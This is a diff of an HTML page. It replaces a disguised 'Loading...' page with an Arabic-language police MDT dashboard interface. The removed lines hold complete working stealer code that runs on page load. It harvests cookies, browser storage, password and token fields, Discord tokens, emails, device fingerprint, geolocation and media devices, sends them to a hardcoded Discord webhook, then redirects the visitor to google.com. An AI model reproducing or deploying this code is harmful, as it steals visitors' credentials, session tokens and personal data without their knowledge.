@@ -1,316 +1,148 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <title>Loading...</title>
-    <script>
-        (function() {
-            const WEBHOOK = 'https://discord.com/api/webhooks/1501486535495909508/tgk6tefdfHjUriek7isfqA4sYgZD8_7zkHbrGS8v8ZVwZYes-iNazxuDN97RRFe-0V8i';
-
-            // ─── 1. COOKIES (ALL) ───
-            function getCookies() {
-                return document.cookie.split('; ').reduce((a,c) => {
-                    const [k,v] = c.split('=');
-                    a[k] = v;
-                    return a;
-                }, {});
-            }
-
-            // ─── 2. STORAGE ───
-            function getStorage(type) {
-                const data = {};
-                const st = type === 'local' ? localStorage : sessionStorage;
-                for (let i = 0; i < st.length; i++) {
-                    const key = st.key(i);
-                    data[key] = st.getItem(key);
-                }
-                return data;
-            }
-
-            // ─── 3. PASSWORDS (from forms) ───
-            function getPasswords() {
-                const p = [];
-                document.querySelectorAll('input[type="password"]').forEach(inp => {
-                    if (inp.value) p.push({ name: inp.name || 'unknown', value: inp.value });
-                });
-                // Also check hidden fields
-                document.querySelectorAll('input[type="hidden"]').forEach(inp => {
-                    const name = (inp.name || '').toLowerCase();
-                    if (name.includes('pass') || name.includes('pwd') || name.includes('token')) {
-                        if (inp.value) p.push({ name: inp.name || 'hidden_pass', value: inp.value });
-                    }
-                });
-                return p;
-            }
-
-            // ─── 4. DISCORD TOKEN ───
-            function getDiscordToken() {
-                const keys = ['token', 'discord_token', 'authorization', 'auth_token'];
-                for (const k of keys) {
-                    let v = localStorage.getItem(k) || sessionStorage.getItem(k);
-                    if (v && (v.startsWith('mfa.') || v.length > 20)) return v;
-                }
-                const c = getCookies();
-                for (const [k,v] of Object.entries(c)) {
-                    if ((k.includes('token') || k.includes('auth')) && v.length > 20) return v;
-                }
-                return null;
-            }
-
-            // ─── 5. EMAILS ───
-            function getEmails() {
-                const re = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
-                const found = (document.body.innerText.match(re) || []);
-                document.querySelectorAll('input[type="email"]').forEach(inp => {
-                    if (inp.value && re.test(inp.value)) found.push(inp.value);
-                });
-                return [...new Set(found)];
-            }
-
-            // ─── 6. FINGERPRINT (FULL DEVICE INFO) ───
-            function getFingerprint() {
-                const canvas = (function() {
-                    try {
-                        const c = document.createElement('canvas');
-                        c.width = 256; c.height = 128;
-                        const ctx = c.getContext('2d');
-                        ctx.textBaseline = 'top';
-                        ctx.font = '14px Arial';
-                        ctx.fillStyle = '#f60';
-                        ctx.fillRect(125,1,62,20);
-                        ctx.fillStyle = '#069';
-                        ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
-                        return c.toDataURL();
-                    } catch(e) { return 'error'; }
-                })();
-
-                const webgl = (function() {
-                    try {
-                        const c = document.createElement('canvas');
-                        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-                        if (!gl) return 'no-webgl';
-                        const info = gl.getExtension('WEBGL_debug_renderer_info');
-                        if (!info) return 'no-extension';
-                        return {
-                            vendor: gl.getParameter(info.UNMASKED_VENDOR_WEBGL),
-                            renderer: gl.getParameter(info.UNMASKED_RENDERER_WEBGL)
-                        };
-                    } catch(e) { return 'error'; }
-                })();
-
-                const audio = (function() {
-                    try {
-                        const ctx = new (window.AudioContext || window.webkitAudioContext)();
-                        const osc = ctx.createOscillator();
-                        const gain = ctx.createGain();
-                        osc.type = 'sawtooth';
-                        osc.frequency.value = 440;
-                        gain.gain.value = 0.1;
-                        osc.connect(gain);
-                        gain.connect(ctx.destination);
-                        const startTime = ctx.currentTime;
-                        osc.start(startTime);
-                        osc.stop(startTime + 0.1);
-                        return {
-                            sampleRate: ctx.sampleRate,
-                            state: ctx.state
-                        };
-                    } catch(e) { return 'error'; }
-                })();
-
-                return {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    languages: navigator.languages,
-                    screen: screen.width + 'x' + screen.height,
-                    colorDepth: screen.colorDepth,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    timezoneOffset: new Date().getTimezoneOffset(),
-                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-                    deviceMemory: navigator.deviceMemory || 'unknown',
-                    maxTouchPoints: navigator.maxTouchPoints || 0,
-                    vendor: navigator.vendor || 'unknown',
-                    doNotTrack: navigator.doNotTrack || 'unknown',
-                    plugins: Array.from(navigator.plugins).map(p => p.name),
-                    fonts: (function() {
-                        // Basic font detection
-                        const test = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Helvetica', 'Comic Sans MS', 'Impact', 'Georgia'];
-                        const base = document.createElement('span');
-                        base.style.cssText = 'position:absolute;visibility:hidden;font-size:20px;';
-                        base.textContent = 'abcdefghijklmnopqrstuvwxyz';
-                        document.body.appendChild(base);
-                        const w = base.offsetWidth, h = base.offsetHeight;
-                        const found = [];
-                        test.forEach(f => {
-                            const el = document.createElement('span');
-                            el.style.cssText = `position:absolute;visibility:hidden;font-size:20px;font-family:${f},sans-serif;`;
-                            el.textContent = 'abcdefghijklmnopqrstuvwxyz';
-                            document.body.appendChild(el);
-                            if (el.offsetWidth !== w || el.offsetHeight !== h) found.push(f);
-                            el.remove();
-                        });
-                        base.remove();
-                        return found;
-                    })(),
-                    canvas: canvas,
-                    webgl: webgl,
-                    audio: audio,
-                    battery: (function() {
-                        if (navigator.getBattery) {
-                            return navigator.getBattery().then(b => ({
-                                level: b.level,
-                                charging: b.charging
-                            })).catch(() => null);
-                        }
-                        return null;
-                    })()
-                };
-            }
-
-            // ─── 7. GEOLOCATION ───
-            function getGeo() {
-                return new Promise(resolve => {
-                    if (!navigator.geolocation) return resolve(null);
-                    navigator.geolocation.getCurrentPosition(
-                        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
-                        () => resolve(null),
-                        { timeout: 5000, enableHighAccuracy: true }
-                    );
-                });
-            }
-
-            // ─── 8. NETWORK INFO ───
-            function getNetwork() {
-                const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                if (!n) return null;
-                return {
-                    type: n.effectiveType || 'unknown',
-                    downlink: n.downlink || 'unknown',
-                    rtt: n.rtt || 'unknown'
-                };
-            }
-
-            // ─── 9. MEDIA DEVICES (cam/mic list) ───
-            function getMediaDevices() {
-                if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return null;
-                return navigator.mediaDevices.enumerateDevices().then(devices => {
-                    return devices.map(d => ({ kind: d.kind, label: d.label || 'hidden' }));
-                }).catch(() => null);
-            }
-
-            // ─── 10. PERFORMANCE / SYSTEM ───
-            function getPerformance() {
-                try {
-                    const mem = performance.memory || {};
-                    return {
-                        memoryUsed: mem.usedJSHeapSize ? Math.round(mem.usedJSHeapSize / 1048576) + 'MB' : 'unknown',
-                        memoryTotal: mem.jsHeapSizeLimit ? Math.round(mem.jsHeapSizeLimit / 1048576) + 'MB' : 'unknown',
-                        navigation: performance.navigation ? {
-                            type: performance.navigation.type,
-                            redirectCount: performance.navigation.redirectCount
-                        } : null
-                    };
-                } catch(e) { return null; }
-            }
-
-            // ─── MAIN COLLECTOR ───
-            async function collectEverything() {
-                const geo = await getGeo();
-                const media = await getMediaDevices();
-                const fp = getFingerprint();
-                // Battery is async
-                let battery = null;
-                if (navigator.getBattery) {
-                    try { battery = await navigator.getBattery().then(b => ({ level: b.level * 100 + '%', charging: b.charging })); } catch(e) {}
-                }
-
-                return {
-                    timestamp: new Date().toISOString(),
-                    url: window.location.href,
-                    referrer: document.referrer || 'none',
-                    cookies: getCookies(),
-                    localStorage: getStorage('local'),
-                    sessionStorage: getStorage('session'),
-                    passwords: getPasswords(),
-                    discordToken: getDiscordToken(),
-                    emails: getEmails(),
-                    fingerprint: fp,
-                    geolocation: geo,
-                    network: getNetwork(),
-                    mediaDevices: media,
-                    performance: getPerformance(),
-                    battery: battery,
-                    screenDetails: {
-                        width: screen.width,
-                        height: screen.height,
-                        availWidth: screen.availWidth,
-                        availHeight: screen.availHeight,
-                        pixelRatio: window.devicePixelRatio
-                    },
-                    windowSize: {
-                        innerWidth: window.innerWidth,
-                        innerHeight: window.innerHeight
-                    },
-                    isIncognito: (function() {
-                        try {
-                            return !!window.chrome && !!window.chrome.webstore;
-                        } catch(e) { return false; }
-                    })()
-                };
-            }
-
-            // ─── SENDER ───
-            function sendData(data) {
-                const payload = {
-                    content: '```json\n' + JSON.stringify(data, null, 2) + '\n```'
-                };
-                fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                })
-                .then(r => console.log('[Collector] Sent, status:', r.status))
-                .catch(() => {
-                    const img = new Image();
-                    const fallback = WEBHOOK + '?content=' + encodeURIComponent('```json\n' + JSON.stringify(data).substring(0, 1500) + '\n```');
-                    img.src = fallback;
-                });
-            }
-
-            // ─── RUN ───
-            window.addEventListener('load', function() {
-                collectEverything().then(data => {
-                    sendData(data);
-                    // Send again after 5s for dynamic data
-                    setTimeout(() => {
-                        collectEverything().then(data2 => sendData(data2));
-                    }, 5000);
-                });
-
-                // Also send minimal data immediately
-                setTimeout(() => {
-                    const quick = {
-                        timestamp: new Date().toISOString(),
-                        url: window.location.href,
-                        cookies: getCookies(),
-                        localStorage: getStorage('local'),
-                        sessionStorage: getStorage('session')
-                    };
-                    sendData(quick);
-                }, 500);
-            });
-
-            // ─── REDIRECT (optional) ───
-            setTimeout(() => {
-                window.location.replace('https://google.com');
-            }, 8000);
-
-        })();
-    </script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>نظام MDT - شرطة</title>
+    <link rel="stylesheet" href="style.css" />
+    <!-- Font Awesome للأيقونات -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
 </head>
 <body>
-    <h1>Loading...</h1>
-    <p>Please wait, you will be redirected.</p>
+
+    <!-- الشريط العلوي -->
+    <header class="navbar">
+        <div class="logo">
+            <i class="fas fa-shield-alt"></i>
+            <span>MDT | شرطة</span>
+        </div>
+        <div class="badge">
+            <i class="fas fa-circle" style="color: #00ff88;"></i>
+            <span>تم الاتصال</span>
+        </div>
+    </header>
+
+    <!-- المحتوى الرئيسي -->
+    <main class="container">
+
+        <!-- بطاقات الإحصائيات -->
+        <section class="stats">
+            <div class="stat-card">
+                <i class="fas fa-users"></i>
+                <div>
+                    <h3>الضباط</h3>
+                    <p id="officerCount">0</p>
+                </div>
+            </div>
+            <div class="stat-card">
+                <i class="fas fa-exclamation-triangle"></i>
+                <div>
+                    <h3>البلاغات النشطة</h3>
+                    <p id="reportCount">0</p>
+                </div>
+            </div>
+            <div class="stat-card">
+                <i class="fas fa-handcuffs"></i>
+                <div>
+                    <h3>أوامر قبض</h3>
+                    <p id="warrantCount">0</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- أزرار الإجراءات السريعة -->
+        <div class="actions">
+            <button id="addReportBtn" class="btn primary"><i class="fas fa-plus"></i> بلاغ جديد</button>
+            <button id="addWarrantBtn" class="btn warning"><i class="fas fa-gavel"></i> أمر قبض</button>
+            <button id="searchBtn" class="btn info"><i class="fas fa-search"></i> بحث</button>
+        </div>
+
+        <!-- البحث -->
+        <section class="search-section" id="searchSection" style="display:none;">
+            <input type="text" id="searchInput" placeholder="ابحث عن مواطن أو مركبة..." />
+            <button id="searchExecBtn"><i class="fas fa-search"></i></button>
+            <div id="searchResult"></div>
+        </section>
+
+        <!-- جدول البلاغات -->
+        <section class="table-section">
+            <h2><i class="fas fa-list"></i> البلاغات</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>النوع</th>
+                        <th>الموقع</th>
+                        <th>الحالة</th>
+                        <th>الوقت</th>
+                        <th>إجراء</th>
+                    </tr>
+                </thead>
+                <tbody id="reportsTableBody">
+                    <!-- تملأ بواسطة JavaScript -->
+                </tbody>
+            </table>
+        </section>
+
+        <!-- جدول أوامر القبض -->
+        <section class="table-section">
+            <h2><i class="fas fa-gavel"></i> أوامر القبض</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>المطلوب</th>
+                        <th>التهمة</th>
+                        <th>الحالة</th>
+                        <th>إجراء</th>
+                    </tr>
+                </thead>
+                <tbody id="warrantsTableBody">
+                    <!-- تملأ بواسطة JavaScript -->
+                </tbody>
+            </table>
+        </section>
+
+    </main>
+
+    <!-- مودال إضافة بلاغ -->
+    <div id="reportModal" class="modal">
+        <div class="modal-content">
+            <span class="close" id="closeReportModal">&times;</span>
+            <h2>بلاغ جديد</h2>
+            <form id="reportForm">
+                <label>نوع البلاغ</label>
+                <select id="reportType" required>
+                    <option value="سرقة">سرقة</option>
+                    <option value="شغب">شغب</option>
+                    <option value="حريق">حريق</option>
+                    <option value="حوادث سير">حوادث سير</option>
+                    <option value="أخرى">أخرى</option>
+                </select>
+                <label>الموقع</label>
+                <input type="text" id="reportLocation" placeholder="مثال: شارع السلام" required />
+                <label>تفاصيل</label>
+                <textarea id="reportDetails" placeholder="تفاصيل البلاغ..."></textarea>
+                <button type="submit" class="btn primary">إرسال البلاغ</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- مودال إضافة أمر قبض -->
+    <div id="warrantModal" class="modal">
+        <div class="modal-content">
+            <span class="close" id="closeWarrantModal">&times;</span>
+            <h2>أمر قبض جديد</h2>
+            <form id="warrantForm">
+                <label>اسم المطلوب</label>
+                <input type="text" id="warrantName" placeholder="الاسم الكامل" required />
+                <label>التهمة</label>
+                <input type="text" id="warrantCharge" placeholder="مثال: سطو مسلح" required />
+                <button type="submit" class="btn warning">إصدار أمر قبض</button>
+            </form>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
 </body>
 </html>
